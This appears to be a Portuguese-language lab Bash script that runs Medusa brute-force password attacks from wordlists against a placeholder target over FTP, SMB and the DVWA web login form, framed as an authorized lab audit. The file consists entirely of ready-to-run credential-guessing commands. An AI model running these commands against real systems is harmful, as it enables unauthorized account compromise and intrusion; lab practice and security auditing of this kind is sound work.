#!/bin/bash
# =========================================================
# Script de referência - Auditoria de Força Bruta com Medusa
# Uso: apenas em laboratório próprio/controlado e autorizado.
# =========================================================

ALVO="<IP_ALVO>"
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"

echo "[*] Iniciando testes de força bruta contra $ALVO"

echo "[1/3] FTP..."
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M ftp

echo "[2/3] Formulário Web (DVWA)..."
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"login.php" \
  -m FORM-DATA:"post?username=&password=&Login=Login"

echo "[3/3] SMB..."
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M smbnt

echo "[*] Testes concluídos. Verifique os logs e evidências em /images."
